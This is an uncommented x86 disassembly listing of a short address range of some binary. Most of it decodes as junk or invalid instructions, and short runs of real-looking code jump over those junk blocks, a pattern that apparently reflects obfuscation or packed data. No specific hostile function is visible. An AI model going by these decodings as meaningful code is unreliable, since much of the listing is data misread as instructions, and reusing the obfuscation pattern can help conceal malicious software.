  4275c7:	imul   eax,DWORD PTR [edi+edx*4],0xf4aaf7d4
  4275ce:	and    cl,BYTE PTR [ebx+edi*2+0x7c221e8e]
  4275d5:	pop    ss
  4275d6:	cmp    BYTE PTR [edx+0x183df535],bh
  4275dc:	icebp  
  4275dd:	mov    esi,0x2a532f3f
  4275e2:	push   ebx
  4275e3:	mov    eax,ds:0xada57eaa
  4275e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275e9:	jge    0x427660
  4275eb:	pushf  
  4275ec:	cld    
  4275ed:	sub    eax,DWORD PTR [ecx+0x10]
  4275f0:	xor    al,0x30
  4275f2:	push   ss
  4275f3:	mov    al,ds:0xf9bfd888
  4275f8:	mov    ebp,0xc167ca55
  4275fd:	fidiv  DWORD PTR [ecx-0x51]
  427600:	mov    esp,0x3124d605
  427605:	mov    ds:0x448b8e37,al
  42760a:	and    al,0x10
  42760c:	mov    ecx,DWORD PTR [esp+0x14]
  427610:	xor    eax,esi
  427612:	sub    eax,edi
  427614:	add    DWORD PTR ds:0x4335c4,edi
  42761a:	mov    ds:0x4332ac,eax
  42761f:	xor    ecx,ecx
  427621:	add    ecx,DWORD PTR ds:0x433690
  427627:	xor    eax,eax
  427629:	xor    eax,DWORD PTR ds:0x430038
  42762f:	sub    eax,ecx
  427631:	and    ecx,DWORD PTR [ecx+eax*1]
  427634:	mov    DWORD PTR [esp+0x78],0xebeb4fd7
  42763c:	movzx  ecx,BYTE PTR ds:0x433598
  427643:	xor    DWORD PTR ds:0x4335b8,ecx
  427649:	mov    DWORD PTR [esp+0x7c],ebx
  42764d:	adc    ecx,eax
  42764f:	mov    eax,DWORD PTR [esp+0x78]
  427653:	or     DWORD PTR ds:0x433590,0x1220
  42765d:	jmp    0x42773d
  427662:	lods   eax,DWORD PTR ds:[esi]
  427663:	add    edx,DWORD PTR [esi-0x5e]
  427666:	(bad)  
  427667:	idiv   ebp
  427669:	(bad)  
  42766b:	adc    dl,BYTE PTR [ebx-0x4b0df939]
  427671:	les    edi,FWORD PTR [edi-0x3cfffe2f]
  427677:	add    BYTE PTR [eax],al
  427679:	add    BYTE PTR [ebp+0xa7aa9e],dh
  42767f:	fild   WORD PTR [eax+0x2c]
  427682:	and    bl,cl
  427684:	les    eax,FWORD PTR [ecx]
  427686:	sbb    esi,DWORD PTR [edx]
  427688:	pusha  
  427689:	rcr    BYTE PTR [edx],cl
  42768b:	scas   eax,DWORD PTR es:[edi]
  42768c:	jbe    0x4276e2
  42768e:	outs   dx,DWORD PTR ds:[esi]
  42768f:	xchg   ebx,eax
  427690:	mov    ah,0xb0
  427692:	rol    DWORD PTR [ebx],0xc7
  427695:	xchg   edx,eax
  427696:	xchg   DWORD PTR [ecx],ebp
  427698:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427699:	pop    edi
  42769a:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42769c:	mov    eax,ds:0x983c733c
  4276a1:	or     dl,dl
  4276a3:	(bad)  
  4276a4:	std    
  4276a5:	stc    
  4276a6:	lahf   
  4276a7:	not    BYTE PTR [ebx]
  4276a9:	data16 mov bl,0xf3
  4276ac:	and    BYTE PTR [edx-0x38],bl
  4276af:	jecxz  0x4276a0
  4276b1:	sub    eax,0x2ff7b651
  4276b6:	cmp    edi,eax
  4276b8:	call   0x452b:0xc4674897
  4276bf:	xchg   ebx,eax
  4276c0:	mov    BYTE PTR ds:0x551d1763,bh
  4276c6:	jge    0x4276f7
  4276c8:	inc    esi
  4276c9:	sbb    al,0xb0
  4276cb:	sub    al,0xa5
  4276cd:	dec    eax
  4276ce:	(bad)  
  4276cf:	mov    eax,0x2119e781
  4276d4:	sub    BYTE PTR [ebx+0x60],0x40
  4276d8:	in     eax,0x98
  4276da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4276db:	jp     0x42768c
  4276dd:	sub    dl,dh
  4276df:	or     eax,DWORD PTR [ebx-0x6fceb02a]
  4276e5:	xor    bh,BYTE PTR [eax+0xd505223]
  4276eb:	or     ebx,DWORD PTR [ecx+edi*4-0x322ba92c]
  4276f2:	mov    ah,0x6a
  4276f4:	jge    0x4276a4
  4276f6:	push   ss
  4276f7:	sub    eax,0xaa5935d5
  4276fc:	mov    ds:0x5006a1cf,al
  427701:	push   ds
  427702:	inc    eax
  427703:	retf   0xda1b
  427706:	add    BYTE PTR [edi+0x165a273e],bl
  42770c:	cmp    ah,BYTE PTR [ebp-0x7ba8e785]
  427712:	fcom   QWORD PTR ds:0xdd42d681
  427718:	mov    cl,dh
  42771a:	cmp    al,0x88
  42771c:	call   0x9899543d
  427721:	mov    ds:0xfebdc9c0,al
  427726:	sbb    BYTE PTR [edi+0x8a8d394],ch
  42772c:	data16 xor bh,dl
  42772f:	inc    eax
  427730:	(bad)  
  427731:	jnp    0x42778e
  427733:	or     ebx,esi
  427735:	jnp    0x4276bf
  427737:	add    BYTE PTR [edi],bl
  427739:	mov    fs,WORD PTR [ebp+0x4c8b2bbc]
  42773f:	and    al,0x7c
  427741:	dec    DWORD PTR ds:0x433538
  427747:	xor    eax,esi
  427749:	sub    DWORD PTR ds:0x43359c,0x433648
  427753:	sub    eax,edi
  427755:	add    DWORD PTR ds:0x433610,0x433550
  42775f:	push   eax
  427760:	mov    eax,ds:0x4331b4
  427765:	and    DWORD PTR ds:0x433574,0x7940
  42776f:	jmp    0x42784f
  427774:	loop   0x427705
  427776:	push   cs
  427777:	xchg   BYTE PTR [edi-0x79],ch
  42777a:	jmp    0xcc1c:0xb078daef
  427781:	in     eax,0xd4
  427783:	lahf   
  427784:	adc    dl,0x1
  427787:	add    bl,al
  427789:	add    BYTE PTR [eax],al
  42778b:	add    BYTE PTR [ebx],dh
  42778d:	cmp    DWORD PTR [esp+ecx*2],edi
  427790:	jb     0x42779a
  427792:	leave  
  427793:	dec    ebp
  427794:	aad    0x58
  427796:	jnp    0x4277b0
  427798:	sub    eax,0xcc9ceb37
  42779d:	ror    DWORD PTR ds:0x3edca2ef,1
  4277a3:	int    0x9d
  4277a5:	pop    esi
  4277a6:	stos   BYTE PTR es:[edi],al
  4277a7:	add    BYTE PTR [edx+0x6c788f6f],dh
  4277ad:	sub    DWORD PTR [ebp-0x49d0ed21],edx
  4277b3:	dec    ecx
  4277b4:	push   0xffffffea
  4277b6:	push   eax
  4277b7:	xchg   edi,eax
  4277b8:	rcr    BYTE PTR [ecx],1
  4277ba:	cli    
  4277bb:	sbb    DWORD PTR [esi-0x713bc34],0xffffff92
  4277c2:	sbb    edi,DWORD PTR [edi-0x38]
  4277c5:	inc    ecx
  4277c6:	out    0xdb,eax
  4277c8:	mov    fs,WORD PTR [edi-0x4402fe91]
  4277ce:	mov    esi,0x4116db6f
  4277d3:	mul    al
  4277d5:	out    0xde,eax
  4277d7:	cmp    eax,0xb9399826
  4277dc:	aad    0x39
  4277de:	imul   DWORD PTR [esi]
  4277e0:	div    BYTE PTR [ebx-0x51]
  4277e3:	loopne 0x4277e6
  4277e5:	ret    0x467
  4277e8:	xchg   esi,ebx
  4277ea:	ret    0x5c2b
  4277ed:	mov    ch,0xcb
  4277ef:	cmp    ecx,eax
  4277f1:	arpl   dx,cx
  4277f3:	mov    edi,0x64e081c3
  4277f8:	inc    esp
  4277f9:	mov    esp,0x18e0b081
  4277fe:	mov    esi,0x658aa072
  427803:	lods   eax,DWORD PTR ds:[esi]
  427804:	loope  0x4277c9
  427806:	pop    eax
  427807:	in     al,0x6a
  427809:	sub    BYTE PTR [ecx-0xdc4794b],bh
  42780f:	nop
  427810:	dec    eax
  427811:	call   0x8f05ec4
  427816:	xchg   ebx,eax
  427817:	test   al,0xbd
  427819:	mov    ecx,DWORD PTR [esi+0x3c6357b9]
  42781f:	jb     0x427892
  427821:	js     0x4277be
  427823:	dec    eax
  427824:	(bad)  
  427825:	idiv   eax
  427827:	sbb    al,0x77
  427829:	imul   ebp,DWORD PTR [edi],0xdd64de28
  42782f:	adc    DWORD PTR [esi-0x23],esp
  427832:	xchg   ebx,eax
  427833:	pop    esi
  427834:	add    BYTE PTR [esi-0x7f],ch
  427837:	(bad)  
  427838:	retf   0x3544
  42783b:	add    cl,BYTE PTR [edi]
  42783d:	dec    ecx
  42783e:	push   ds
  42783f:	mov    cl,BYTE PTR fs:[edi-0x13489808]
  427846:	sub    bl,BYTE PTR [ecx+edx*1]
  427849:	rcl    DWORD PTR [esi+0x70],cl
  42784c:	sbb    bh,dl
  42784e:	(bad)  
  427850:	mov    al,0x8c
  427852:	add    DWORD PTR [eax],eax
  427854:	add    bh,al
  427856:	add    eax,0x433640
  42785b:	inc    eax
  42785c:	adc    BYTE PTR [eax],al
  42785e:	add    BYTE PTR [ebp+0x8c2484],cl
  427864:	add    BYTE PTR [eax],al
  427866:	adc    DWORD PTR ds:0x433670,0x433594
  427870:	jmp    0x427950
  427875:	out    dx,al
  427876:	jns    0x427839
  427878:	sub    dl,bh
  42787a:	mov    edx,0x62d6fdef
  42787f:	adc    ch,BYTE PTR [esi+0x58]
  427882:	lods   al,BYTE PTR ds:[esi]
  427883:	inc    ecx
  427884:	pop    edi
  427885:	inc    ebp
  427886:	rol    DWORD PTR [ecx],cl
  427888:	add    bl,al
  42788a:	add    BYTE PTR [eax],al
  42788c:	add    ah,ch
  42788e:	es or  ebp,edi
  427891:	inc    ebx
  427892:	ss xchg ecx,eax
  427894:	jmp    0xc058d1d5
  427899:	push   esi
  42789a:	aam    0xb2
  42789c:	loopne 0x42789c
  42789e:	push   esp
  42789f:	dec    BYTE PTR [edi-0x64fdbc3d]
  4278a5:	daa    
  4278a6:	aas    
  4278a7:	and    eax,DWORD PTR [edx+ebx*1+0xb]
  4278ab:	in     al,dx
  4278ac:	inc    esi
  4278ad:	mov    cl,0x89
  4278af:	adc    edx,esi
  4278b1:	dec    ecx
  4278b2:	(bad)  
  4278b4:	bound  esi,QWORD PTR [ebx+esi*1]
  4278b7:	cmp    DWORD PTR [esi-0xfe260ac],0x7c
  4278be:	push   ebp
  4278bf:	pop    esi
  4278c0:	das    
  4278c1:	or     esp,DWORD PTR [ebx-0x28]
  4278c4:	imul   BYTE PTR [esi]
  4278c6:	sbb    ah,BYTE PTR [esi-0x7b]
  4278c9:	xchg   ecx,eax
  4278ca:	aad    0x49
  4278cc:	push   edx
  4278cd:	cmp    al,BYTE PTR [ebx+0x6a28b5a9]
  4278d3:	idiv   BYTE PTR [ecx-0x292e0229]
  4278d9:	loop   0x427939
  4278db:	pop    esi
  4278dc:	push   edx
  4278dd:	ja     0x427926
  4278df:	add    al,0x5
  4278e1:	shr    DWORD PTR [edx-0x78],0x32
  4278e5:	pop    ebp
  4278e6:	mov    esi,DWORD PTR [esi-0x5d]
  4278e9:	idiv   BYTE PTR [edx-0x3240b9d]
  4278ef:	mov    ecx,0x54f91f84
  4278f5:	xchg   esi,eax
  4278f6:	std    
  4278f7:	inc    esi
  4278f8:	loop   0x4278f8
  4278fa:	xor    al,0x18
  4278fc:	sbb    dl,bl
  4278fe:	xor    BYTE PTR [ebx-0x4819b3c0],dh
  427904:	ror    BYTE PTR [edx-0x514e010f],1
  42790a:	js     0x427936
  42790c:	js     0x427924
  42790e:	xchg   ebx,eax
  42790f:	mov    dh,BYTE PTR [eax+0x639e4102]
  427915:	test   DWORD PTR [ebp-0x6498e3c2],ebx
  42791b:	push   eax
  42791c:	dec    ecx
  42791d:	push   0xffffffac
  42791f:	push   DWORD PTR [edi+esi*1]
  427922:	out    dx,eax
  427923:	cmp    eax,0xec85a6a6
  427928:	sti    
  427929:	cmp    esp,edi
  42792b:	dec    esi
  42792c:	repnz sub ecx,DWORD PTR [esi-0x4a]
  427930:	add    BYTE PTR [edx-0x10],0x0
  427934:	pop    esi
  427935:	cs dec ebp
  427937:	sar    BYTE PTR gs:[edx-0x671ec0d8],cl
  42793e:	popa   
  42793f:	std    
  427940:	bound  ebx,QWORD PTR [ebp-0x19c59ff9]
  427946:	mov    eax,ds:0x3afe79ae
  42794b:	test   DWORD PTR [edi],ecx
  42794d:	aad    0x7f
  42794f:	pop    esp
  427950:	push   eax
  427951:	jmp    0x427a31
  427956:	in     al,dx
  427957:	push   esi
  427958:	loopne 0x427925
  42795a:	cli    
  42795b:	(bad)  
  42795c:	out    dx,eax
  42795d:	ja     0x4279be
  42795f:	ret    0x706a
  427962:	adc    DWORD PTR [ecx-0x2bf71bfd],esp
  427968:	add    DWORD PTR [eax],eax
  42796a:	ret    
  42796b:	add    BYTE PTR [eax],al
  42796d:	add    BYTE PTR [edi+0xc5afa69],al
  427973:	mov    esi,0xb38589fd
  427978:	(bad)  
  427979:	in     al,dx
  42797a:	daa    
  42797b:	push   esp
  42797c:	retf   
  42797d:	push   esp
  42797e:	mov    cl,0x48
  427980:	test   DWORD PTR [ebx-0x6568777b],0xea8e89f9
  42798a:	aaa    
  42798b:	lods   eax,DWORD PTR ds:[esi]
  42798c:	pop    esi
  42798d:	dec    ebx
  42798e:	stos   DWORD PTR es:[edi],eax
  42798f:	jno    0x42792f
  427991:	adc    BYTE PTR [edx],0x74
  427994:	dec    eax
  427995:	push   eax
  427996:	mov    ebx,0x54236280
  42799b:	ss inc esp
  42799d:	sub    DWORD PTR [ebp+0x2],esp
  4279a0:	jae    0x427932
  4279a2:	aaa    
  4279a3:	add    al,BYTE PTR [edx-0x5e]
  4279a6:	ret    0xf90a
  4279a9:	xor    BYTE PTR [ecx-0x97fe489],al
  4279af:	retf   
  4279b0:	popa   
  4279b1:	(bad)  
  4279b2:	stc    
  4279b3:	aaa    
  4279b4:	test   BYTE PTR [esi],bl
  4279b6:	xchg   edx,eax
  4279b7:	inc    edx
  4279b8:	jge    0x427a27
  4279ba:	mov    dh,0x1a
  4279bc:	pushf  
  4279bd:	clc    
  4279be:	mov    WORD PTR [ebx],?
  4279c0:	push   ebx
  4279c1:	mov    bl,0x4e
  4279c3:	dec    edi
  4279c4:	jl     0x4279b2
  4279c6:	in     eax,0x51
  4279c8:	cdq    
  4279c9:	or     edi,DWORD PTR [edi-0x16]
  4279cc:	inc    ebx
  4279cd:	dec    edx
  4279ce:	sbb    eax,0xc372dbcc
  4279d3:	sbb    BYTE PTR [esi+0x7a026823],dl
  4279d9:	cmp    ch,BYTE PTR [ebx-0x57c59a0a]
  4279df:	retf   
  4279e0:	into   
  4279e1:	sar    eax,0x8e
  4279e4:	js     0x4279f3
  4279e6:	jge    0x427979
  4279e8:	sbb    esi,DWORD PTR [ebx+0x1b3cc0a2]
  4279ee:	pop    edi
  4279ef:	rcr    bl,cl
  4279f1:	imul   ebp,ebx,0x27
  4279f4:	(bad)  
  4279f5:	daa    
  4279f6:	jno    0x427a24
  4279f8:	fld    DWORD PTR es:[eax]
  4279fb:	sahf   
  4279fc:	rcr    BYTE PTR [edi+0x68],cl
  4279ff:	sub    al,0x96
  427a01:	jmp    0x14142538
  427a06:	sub    al,0x0
  427a08:	or     DWORD PTR [ecx],0x255cd8aa
  427a0e:	es cmp eax,0xcb279d63
  427a14:	imul   ebx,DWORD PTR [eax],0x1a517970
  427a1a:	ret    0x7a2a
  427a1d:	stos   DWORD PTR es:[edi],eax
  427a1e:	shl    DWORD PTR [edi-0x61],cl
  427a21:	pop    DWORD PTR [eax]
  427a23:	jmp    0x427a36
  427a25:	jp     0x4279ac
  427a27:	ja     0x427a34
  427a29:	xor    DWORD PTR [edi],edi
  427a2b:	pop    edx
  427a2c:	jae    0x427a0d
  427a2e:	int3   
  427a2f:	push   0xffffffe5
  427a31:	call   0x41d107
  427a36:	mov    eax,ds:0x433564
  427a3b:	sub    DWORD PTR ds:0x433544,eax
  427a41:	jmp    0x427b21
  427a46:	aad    0xb0
  427a48:	repnz int3 
  427a4a:	test   esi,0x59bbb9ff
  427a50:	sub    eax,0xdb84660d
  427a55:	jp     0x427a22
  427a57:	aam    0x1
  427a59:	add    bl,al
  427a5b:	add    BYTE PTR [eax],al
  427a5d:	add    BYTE PTR [edx+0x153df210],ah
  427a63:	mov    edx,DWORD PTR [ebx+edx*8-0x3c]
  427a67:	mov    al,ds:0xc98f9d3c
  427a6c:	mov    bl,cl
  427a6e:	adc    edx,ebp
  427a70:	test   al,0x1d
  427a72:	push   0x56
  427a74:	aas    
  427a75:	shr    al,1
  427a77:	out    dx,al
  427a78:	sahf   
  427a79:	(bad)  
  427a7a:	jb     0x427a66
  427a7c:	push   esp
  427a7d:	xor    bl,BYTE PTR [ecx-0x3b2aae6c]
  427a83:	inc    ebp
  427a84:	mov    al,0xbf
  427a86:	and    bh,BYTE PTR [edi+ebp*2]
  427a89:	inc    edi
  427a8a:	push   0x7b2d50bc
  427a8f:	pop    eax
  427a90:	fidivr DWORD PTR [esi]
  427a92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a93:	pop    esi
  427a94:	mov    eax,ds:0x11f74760
  427a99:	xor    bl,BYTE PTR [edi+0x9cf8e24]
  427a9f:	jb     0x427aa6
  427aa1:	daa    
  427aa2:	and    dl,BYTE PTR [esi]
  427aa4:	mov    edx,DWORD PTR [edx+0x3c77622b]
  427aaa:	cwde   
  427aab:	xchg   DWORD PTR [ecx+0x76],edi
  427aae:	dec    edi
  427aaf:	(bad)  
  427ab0:	adc    DWORD PTR [ecx+0x6d],edx
  427ab3:	sti    
  427ab4:	(bad)
  427ab8:	retf   0xfa71
  427abb:	out    0x45,eax
  427abd:	retf   0xa15d
  427ac0:	mov    esp,0xcd71a21b
  427ac5:	mov    edx,0xc0ff0b9b
  427aca:	loop   0x427a69
  427acc:	add    al,0xd8
  427ace:	push   edi
  427acf:	cli    
  427ad0:	js     0x427ad6
  427ad2:	push   ss
  427ad3:	idiv   dl
  427ad5:	push   cs
  427ad6:	loop   0x427a66
  427ad8:	mov    ebx,0xfc7cb4ae
  427add:	iret   
  427ade:	scas   eax,DWORD PTR es:[edi]
  427adf:	not    DWORD PTR [eax+0x66]
  427ae2:	dec    edx
  427ae3:	sub    DWORD PTR [eax-0x5ef2eeea],0xffffffd3
  427aea:	dec    ecx
  427aeb:	sbb    esi,DWORD PTR [esi+edx*2+0xe]
  427aef:	sub    dl,BYTE PTR [eax+0x7f10fff7]
  427af5:	push   ebx
  427af6:	sbb    DWORD PTR [esi],edi
  427af8:	inc    ecx
  427af9:	push   ds
  427afa:	call   0x3774c357
  427aff:	pushf  
  427b00:	push   0x88f1ff32
  427b05:	pop    eax
  427b06:	jl     0x427a90
  427b08:	(bad)  [eax-0xb4b643c]
  427b0e:	adc    al,0xc0
  427b10:	sahf   
  427b11:	mov    ah,0xf
  427b13:	pop    esp
  427b14:	repnz shl dl,cl
  427b17:	outs   dx,BYTE PTR ds:[esi]
  427b18:	pop    ebp
  427b19:	pop    ebx
  427b1a:	cmp    eax,0x441972e5
  427b1f:	push   ebx
  427b20:	int3   
  427b21:	mov    eax,0xebeb4fd7
  427b26:	mov    DWORD PTR [esp+0x18],eax
  427b2a:	sbb    DWORD PTR ds:0x4335f4,0x4f0b
  427b34:	jmp    0x427c14
  427b39:	push   ebp
  427b3a:	sti    
  427b3b:	inc    ebp
  427b3c:	(bad)  
  427b3d:	out    dx,eax
  427b3e:	(bad)  
  427b3f:	(bad)  
  427b40:	sti    
  427b41:	(bad)  
  427b42:	mov    al,ds:0x3d0ee486
  427b47:	test   eax,0x1d58ea1
  427b4c:	add    bl,al
  427b4e:	add    BYTE PTR [eax],al
  427b50:	add    BYTE PTR [edi+0x53601118],ch
  427b56:	fs push ds
  427b58:	pusha  
  427b59:	js     0x427bbe
  427b5b:	pushf  
  427b5c:	xchg   DWORD PTR [edi],ebp
  427b5e:	sub    dl,BYTE PTR [ebx-0x3c]
  427b61:	pushf  
  427b62:	mov    ch,0xe0
  427b64:	fwait
  427b65:	stc    
  427b66:	cmp    BYTE PTR [edi-0x22],al
  427b69:	adc    cl,bl
  427b6b:	jle    0x427b0d
  427b6d:	mov    DWORD PTR [ebx+0x5f5cb222],ebx
  427b73:	lods   eax,DWORD PTR ds:[esi]
  427b74:	cmp    eax,0xaa512d0d
  427b79:	and    al,0x33
  427b7b:	addr16 mov ebp,0x3653efa
  427b81:	push   eax
  427b82:	lds    edi,FWORD PTR [esi-0x2348048e]
  427b88:	sbb    dl,BYTE PTR [ebx+esi*2-0x4181b00]
  427b8f:	jecxz  0x427be0
  427b91:	aam    0x14
  427b93:	xchg   BYTE PTR [esi],al
  427b95:	out    0xae,al
  427b97:	data16 int 0x9c
  427b9a:	fcomp  QWORD PTR ds:0x36ed420d
  427ba0:	pop    ss
  427ba1:	(bad)  
  427ba2:	int3   
  427ba3:	jo     0x427b73
  427ba5:	xlat   BYTE PTR ds:[ebx]
  427ba6:	ret    0x9405
  427ba9:	jecxz  0x427c07
  427bab:	cmp    BYTE PTR [eax+0x45],al
  427bae:	mov    ds:0x4d63b381,eax
  427bb3:	push   ss
  427bb4:	mov    dh,0x8
  427bb6:	icebp  
  427bb7:	xchg   BYTE PTR [ecx],bl
  427bb9:	mov    ebx,0x303fe417
  427bbe:	xor    eax,0x32a59e29
  427bc3:	inc    ebx
  427bc4:	jae    0x427c12
  427bc6:	push   ds
  427bc7:	jecxz  0x427b4e
  427bc9:	fld    QWORD PTR [ecx+0x6e8b6c6e]
  427bcf:	jl     0x427bf6
  427bd1:	aaa    
  427bd2:	pop    ebx
  427bd3:	ret    
  427bd4:	mov    al,ds:0x8cfe109
  427bd9:	inc    ebp
  427bda:	call   0x8cf3:0xd2d224c1
  427be1:	retf   0xc14f
  427be4:	inc    esi
  427be5:	pop    ds
  427be6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427be7:	enter  0x9d11,0xd3
  427beb:	cmp    BYTE PTR [edi+eiz*1+0x68],ch
  427bef:	dec    ebp
  427bf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427bf1:	adc    BYTE PTR gs:[eax],0x5f
  427bf5:	dec    ecx
  427bf6:	adc    DWORD PTR [ecx+0x3d],edi
  427bf9:	jecxz  0x427b7e
  427bfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427bfc:	mov    esp,0x235c45d3
  427c01:	mov    WORD PTR [eax],fs
  427c03:	cmp    al,0xe7
  427c05:	pop    edi
  427c06:	paddq  mm5,QWORD PTR [edx+edi*1]
  427c0a:	lods   eax,DWORD PTR ds:[esi]
  427c0b:	ror    BYTE PTR [edi],1
  427c0d:	pop    ds
  427c0e:	push   ss
  427c0f:	push   esi
  427c10:	inc    ecx
  427c11:	push   esp
  427c12:	adc    eax,0x245c8952
  427c17:	sbb    al,0x81
  427c19:	sbb    eax,0x433650
  427c1e:	loopne 0x427c55
  427c20:	inc    ebx
  427c21:	add    BYTE PTR [ecx-0x16e7dbbc],cl
  427c27:	fild   DWORD PTR [eax]
  427c29:	add    BYTE PTR [eax],al
  427c2b:	popa   
  427c2c:	mov    eax,ds:0xdcfdc47d
  427c31:	stc    
  427c32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c33:	and    bh,BYTE PTR [edi]
  427c35:	xchg   ebp,ecx
  427c37:	sbb    ah,BYTE PTR [esi+0x3a]
  427c3a:	mov    edi,0x1d651
  427c3f:	ret    
  427c40:	add    BYTE PTR [eax],al
  427c42:	add    ah,dh
  427c44:	sbb    ecx,ecx
  427c46:	aad    0x23
  427c48:	mov    edx,DWORD PTR [ebp+eax*8-0x1e]
  427c4c:	fidivr WORD PTR [ecx-0x36da0f5]
  427c52:	jmp    0x427cb4
  427c54:	mov    ebx,DWORD PTR [esi]
  427c56:	mov    bl,0x8b
  427c58:	and    DWORD PTR [ecx-0x4ebfcc85],0x68
  427c5f:	cdq    
  427c60:	jmp    0x4e8ee23b
  427c65:	hlt    
  427c66:	out    0x3,eax
  427c68:	jmp    0x427cb3
  427c6a:	lods   eax,DWORD PTR ds:[esi]
  427c6b:	push   cs
  427c6c:	popf   
  427c6d:	cmp    ebx,esp
  427c6f:	xchg   ebp,eax
  427c70:	xor    eax,0xff9f005a
  427c75:	aas    
  427c76:	and    BYTE PTR [edx-0x3fb93451],ch
  427c7c:	or     ebx,eax
  427c7e:	call   0xd24ba0e
  427c83:	mov    al,0x48
  427c85:	aaa    
  427c86:	ret    0x85d2
  427c89:	in     eax,0x3
  427c8b:	inc    ebx
  427c8c:	inc    ecx
  427c8d:	jbe    0x427d00
  427c8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c90:	adc    eax,0xa23653e
  427c95:	cli    
  427c96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c97:	stc    
  427c98:	push   esp
  427c99:	adc    ebp,ebp
  427c9b:	call   0x6f08:0xeadd7644
  427ca2:	inc    edi
  427ca3:	cmp    dh,BYTE PTR [ecx-0x45a6f1b9]
  427ca9:	push   esp
  427caa:	clc    
  427cab:	and    dl,bl
  427cad:	or     BYTE PTR [ebx-0x3b952905],ah
  427cb3:	sub    dh,BYTE PTR [esi+0x28]
  427cb6:	aad    0x35
  427cb8:	fsub   QWORD PTR [ecx+0x5354deee]
  427cbe:	mov    eax,0x1c85f750
  427cc3:	push   es
  427cc4:	pop    ecx
  427cc5:	xor    BYTE PTR [eax+eax*4+0x7c],dh
  427cc9:	add    al,0x22
  427ccb:	cwde   
  427ccc:	or     eax,0xb24566e
  427cd2:	(bad)  
  427cd3:	lods   eax,DWORD PTR ds:[esi]
  427cd4:	add    BYTE PTR ds:0xb3cf6939,bh
  427cda:	cdq    
  427cdb:	sbb    edi,0x18396605
  427ce1:	pop    edi
  427ce2:	mov    ch,0x15
  427ce4:	xchg   BYTE PTR [esp+edi*4],bh
  427ce7:	inc    edx
  427ce8:	fwait
  427ce9:	sub    BYTE PTR [ecx-0x29dbcf57],ch
  427cef:	(bad)  
  427cf1:	popa   
  427cf2:	mov    edi,0x3a4f6b7e
  427cf7:	cli    
  427cf8:	inc    ebx
  427cf9:	std    
  427cfa:	cld    
  427cfb:	pop    edx
  427cfc:	inc    esp
  427cfd:	pop    edx
  427cfe:	retfw  0x896e
  427d02:	sbb    al,0x67
  427d04:	std    
  427d05:	mov    ebp,0x1c245c89
  427d0a:	mov    DWORD PTR [esp+0x18],eax
  427d0e:	jmp    0x427dee
  427d13:	adc    eax,0xa243a2b7
  427d18:	push   edi
  427d19:	cmc    
  427d1a:	test   DWORD PTR [ebx-0x9],0x1a88024d
  427d21:	pop    ds
  427d22:	in     al,0x14
  427d24:	xlat   BYTE PTR ds:[ebx]
  427d25:	add    DWORD PTR [eax],eax
  427d27:	ret    
  427d28:	add    BYTE PTR [eax],al
  427d2a:	add    BYTE PTR ds:0xacec38a1,bh
  427d30:	or     BYTE PTR [edx],dl
  427d32:	outs   dx,DWORD PTR ds:[esi]
  427d33:	jmp    0x427d14
  427d35:	scas   eax,DWORD PTR es:[edi]
  427d36:	int3   
  427d37:	enter  0xba0d,0x25
  427d3b:	sub    esi,DWORD PTR [esi-0x1e]
  427d3e:	dec    edx
  427d3f:	jecxz  0x427cd6
  427d41:	mov    edi,0xa243eb1a
  427d46:	sar    DWORD PTR [edi+eax*4-0x31],cl
  427d4a:	adc    BYTE PTR [ecx+edx*1],al
  427d4d:	sub    eax,0xfdedb882
  427d52:	icebp  
  427d53:	leave  
  427d54:	call   0x9d9a:0x1ead3b4
  427d5b:	inc    esi
  427d5c:	(bad)  
  427d5d:	jb     0x427d0e
  427d5f:	es ds jge 0x427db9
  427d63:	cmp    ch,dl
  427d65:	(bad)  
  427d66:	out    dx,al
  427d67:	push   ebp
  427d68:	int    0x19
  427d6a:	or     ebx,DWORD PTR [ecx-0x40]
  427d6d:	and    eax,0x5e209874
  427d72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d73:	push   edx
  427d74:	pop    ebp
  427d75:	test   eax,0xceaccb58
  427d7a:	sub    al,BYTE PTR [ebx-0xd3d32f]
  427d80:	jg     0x427dc2
  427d82:	pop    eax
  427d83:	pop    ecx
  427d84:	mov    esi,0x80e69cb6
  427d89:	fistp  WORD PTR ds:[eax+ebp*1-0x71]
  427d8e:	add    BYTE PTR [esi+0x54c36e25],bl
  427d94:	ins    BYTE PTR es:[edi],dx
  427d95:	adc    DWORD PTR [esi+0x1e],esp
  427d98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d99:	mov    esp,0x7301b67e
  427d9e:	pop    esi
  427d9f:	ret    
  427da0:	test   DWORD PTR [edi+0x11],esi
  427da3:	in     al,dx
  427da4:	mov    ebp,ebx
  427da6:	scas   eax,DWORD PTR es:[edi]
  427da7:	gs test al,0x88
  427daa:	jmp    0x479a0acf
  427daf:	mov    ah,0x57
  427db1:	and    al,0xf5
  427db3:	jne    0x427dc6
  427db5:	push   ss
  427db6:	push   edx
  427db7:	inc    ecx
  427db8:	mov    bh,0x86
  427dba:	pop    ecx
  427dbb:	std    
  427dbc:	in     al,dx
  427dbd:	lea    ebp,[ebx+0x6ce854]
  427dc3:	cmp    cl,BYTE PTR [edx+0x21]
  427dc6:	hlt    
  427dc7:	ficom  DWORD PTR [ebp-0x75663190]
  427dcd:	mov    ?,WORD PTR [eax-0x41ac9e09]
  427dd3:	mov    ah,0x85
  427dd5:	arpl   WORD PTR [edi-0x6f],bx
  427dd8:	daa    
  427dd9:	xchg   edi,eax
  427dda:	mov    DWORD PTR [eax+edi*4-0x2640c0f0],0x851fc564
  427de5:	test   al,0x8d
  427de7:	xchg   BYTE PTR [edx*4+0xe4d7100],cl
  427dee:	lea    eax,[ebp+0x10]
  427df1:	mov    DWORD PTR ds:0x43361c,0x40ba
  427dfb:	push   eax
  427dfc:	or     DWORD PTR ds:0x433658,0x433670
  427e06:	lea    eax,[ebp+0xc]
  427e09:	jmp    0x427ee9
